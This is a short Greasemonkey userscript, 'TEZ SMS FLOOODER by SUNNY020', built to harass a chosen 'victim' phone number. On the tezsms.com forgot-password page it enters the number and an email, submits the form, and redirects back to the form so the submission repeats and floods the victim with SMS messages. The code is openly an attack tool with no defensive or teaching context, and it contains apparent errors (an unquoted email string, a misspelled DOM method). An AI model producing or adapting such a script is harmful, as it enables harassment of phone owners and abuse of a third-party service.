// ==UserScript==
// @name               TEZ SMS FLOOODER by SUNNY020
// @namespace      SUNNY020
// @description       FLOODER
// @include             http://*tezsms.com/*
// ==/UserScript==

var victim=8092262928; // change the number here
var email=abab@gmail.com; // enter email 
if(document.location=="http://www.tezsms.com/forgotpassword.asp"||document.location=="http://www.tezsms.com/forgotpassword.asp")
{
document.getElementByName('MobileNo').value=victim;
document.getElementByName('email').value=email;
document.getElementByName('btnSendNow2').click();
}
if(document.location=="http://www.tezsms.com/sendforgotpassword.asp")
{
document.location=("http://www.tezsms.com/forgotpassword.asp");
}